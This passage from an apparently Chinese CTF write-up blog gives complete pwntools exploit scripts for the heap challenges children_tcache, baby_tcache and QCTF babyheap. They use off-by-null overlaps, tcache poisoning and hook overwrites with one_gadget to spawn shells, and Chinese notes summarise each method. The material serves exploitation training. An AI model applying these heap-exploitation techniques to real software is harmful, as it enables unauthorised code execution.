    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```



#### 总结

1. 这道题难在利用,过程我看的exp可能很繁杂,建议找别的exp,这个 exp锻炼了我的逆向能力,中途还有单链表循环,我不知道他怎么解的,发觉通过覆盖可以解掉循环, 多练习吧,挺难的一道题,我觉得
2. 学会看源码找错,出现什么错误就去看malloc源码





## hitcon



### children_tcache



### 漏洞点

![image-20200406101216146](https://gitee.com/NoOne-hub/picture/raw/master/img/20200512110119.png)

strcpy会复制\x00到结尾

至于漏洞利用,我放在总结那里了



#### 基于tcache数量的exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './children_tcache'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(": ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, data):
    sla(":", size)
    sa(":", data)

@choice(idx=2)
def show(idx):
    sla(":", idx)

@choice(idx=3)
def delete(idx):
    sla(":", idx)

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(0xf8, "a") #0
    new(0x18, "a") #1
    new(0xf8, "a") #2

    for i in range(7):
        new(0xf8, "a")
    for i in range(3, 10):
        delete(i)    
    delete(1)
    delete(0)
    
    for i in range(6):
        new(0x18-i, "a"*(0x18-i)) 
        delete(0)
    new(0x18, (0x18-8)*"a" + p16(0x120)) #0
    delete(2)
    for i in range(7):
        new(0xf0, "a") 
    new(0xf0, "a") #8
    show(0)
    libc.address = uu64(r(6)) - 0x3ebca0
    lg("libc", libc.address)
    new(0x18, "a") #9
    for i in range(1,8):
        delete(i)
    delete(9)
    delete(0)
    
    new(0x18, p64(libc.sym['__malloc_hook']))
    new(0x18, "a")
    new(0x18, p64(libc.address+one_gadget[1]))
    sl("1")
    sl("1")
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```

#### 基于tcache大小的exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './children_tcache'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(": ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, data):
    sla(":", size)
    sa(":", data)

@choice(idx=2)
def show(idx):
    sla(":", idx)

@choice(idx=3)
def delete(idx):
    sla(":", idx)


def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(0x4f0, "a") #0
    new(0x18, "a") #1
    new(0x4f0, "a") #2
    new(0x18, "a") #3
    
    delete(0)
    delete(1)
    for i in range(6):
        new(0x18-i, "A"*(0x18-i))
        delete(0)
    new(0x18, "A"*(0x18-8) + p16(0x520)) #0
    delete(2)
    new(0x4f0, 'a') #1
    show(0)
    libc.address = uu64(r(6))-0x3ebca0
    lg("libc", libc.address)
    new(0x18, "A") #2

    delete(2)
    delete(0)

    new(0x18, p64(libc.sym['__malloc_hook']))
    new(0x18, "A")
    #ga()
    new(0x18, p64(libc.address + one_gadget[1]))
    sl("1")
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```



#### 总结攻击方法

- 基于tcache数量的攻击
- 基于tcache大小的攻击



off-by-null基于tcache数量的攻击

tcache数量最大为7个,free的同大小的chunk大于7个,便可以变成unsortedbin

1. 首先构造3个堆块,为了overlap 大小依次为0xf8--0x18--0xf8
2. 申请7个堆块,填满0xf0的chunk
3. 这时候free掉第一块,为后面overlap做准备,这个块同时也进入了unsortedbin
4. 利用第二块0x18的off-by-null,溢出掉第三块的标志位,同时覆盖pre_size为0x120
5. 这时候free掉第三块,便可以造成overlap了



off-by-null基于tcache大小的攻击

tcache最大为0x410, 因此,大于0x410的可以直接进入unsortedbin

1. 构造4个堆块,为了overlap,最后一个0x18为了防止跟top_chunk合并,大小依次为0x4f0,0x18,0x4f0,0x18
2. free掉第一块先,为后面overlap做准备,这个块同时也进入了unsortedbin
3. 利用第二块的off-by-null,溢出覆盖掉第三块的标志位,同时覆盖pre_size为0x520
4. 这时候free第三块就可以overlap了



后面tcache double free没什么技术含量,打malloc_hook就好了





### baby_tcache

我觉得这道爆破很怪异,爆破时间居然这么长,只是爆破16位,居然花了好久,简单的一道题,只有new跟delete,一看就知道要打stdout,泄露libc,然后后面没啥高级操作,只是爆破,这里有个小点注意下



在进行unsortedbin合并的时候,无法申请0x18类似的,就是不能带0x8的,只能为整数,这里不理解

#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './baby_tcache'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(": ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, data):
    sla(":", size)
    sa(":", data)

@choice(idx=2)
def delete(idx):
    sla(":", idx)

one_gadget = get_one_gadget(libc.path)
def exp(host, rce=False):
    if rce:
        pass    
    new(0x4f0, "a") #0
    new(0x20, "a") #1
    new(0x20, "a") #2
    new(0x4f0, "a") #3
    new(0x20, "a") #4
    delete(2)
    new(0x28, "a"*0x20 + p64(0x560)) #2
    delete(0)
    delete(3)
    delete(1)
    new(0x4f0, "a") #0
    new(0x100, p16(0x4760)) #1
    new(0x20, "a") #3
    #ga("breakrva 0xD2C\nc")
    new(0x20, p64(0x800)+"\x00"*9)
    r(8)
    libc.address = uu64(r(6))
    if hex(libc.address)[2:4] != '7f':
        raise Exception 
    libc.address -=   0x3ed8b0
    lg("libc", libc.address)
    delete(3)
    #ga()
    delete(1)
    new(0x100, p64(libc.sym['__free_hook']))
    new(0x100, p64(0))
    new(0x100, p64(libc.address + one_gadget[1]))
    sl("2")
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    while True:
        try:
            exp(host,True)
            break
        except Exception as e:
            print(e)
            io.close()
            io = process(exe)

```





##  XCTF 4th-QCTF-2018



### babyheap

直接给exp了,简单题,最主要要用realloc调整下栈

2.27版本

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './timu'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(" :\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, content):
    sla(": \n", size)
    sla(": \n", content)

@choice(idx=2)
def delete(idx):
    sla(": \n", idx)

@choice(idx=3)
def show():
    pass


def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(0x4f0, "a") #0
    new(0x18, "a") #1
    new(0x18, "a") #2
    new(0x4f0, "a") #3
    new(0x18, "a") #4
    delete(0)
    delete(2)
    new(0x18, "a"*0x10 + p64(0x500+0x20+0x20)) #0
    delete(3)
    new(0x4f0, "A") #2
    show()
    ru("1 : ")
    libc.address = uu64(r(6)) - 0x3ebca0
    lg("libc", libc.address)
    new(0x18, "a") #3
    delete(3)
    delete(1)
    new(0x18, p64(libc.sym['__realloc_hook']))
    #new(0x18, p64(libc.sym['__malloc_hook']))
    new(0x18, "a")
    #new(0x18, p64(0xAAAAAAAA))
    new(0x18, p64(libc.address+one_gadget[0]) + p64(libc.sym['realloc']+2))
    sl("1")
    sl("1")
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```

2.23版本

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './timu'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(" :\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, content):
    sla(": \n", size)
    sla(": \n", content)

@choice(idx=2)
def delete(idx):
    sla(": \n", idx)

@choice(idx=3)
def show():
    pass


def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    
    new(0xf8, "A") #0
    new(0x18, "A") #1
    new(0x68, "A") #2
    new(0xf8, "A") #3
    new(0x68, "A") #4
    new(0x18, "A") #5

    delete(2)
    new(0x68, "A"*0x60 + p64(0x20+0x70+0x100)) #2
    delete(0)
    delete(3)
    new(0xf8, "A") #0
    show()
    ru("1 : ")
    libc.address = uu64(r(6)) - 0x3c4b78
    lg("libc", libc.address)
    delete(4)
    delete(2)
    new(0x48, "A"*0x10 + p64(0) + p64(0x71) + p64(libc.sym['__realloc_hook']-0x1b))
    new(0x68, "A")
    new(0x68, "A"*0xb + p64(libc.address + one_gadget[1]) + p64(libc.sym['realloc']+2))
    #new(0x68, "A"*0xb + p64(libc.address + one_gadget[0]) + p64(0xAAAAAAAA))
    sl("1")
    sl("1")
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```

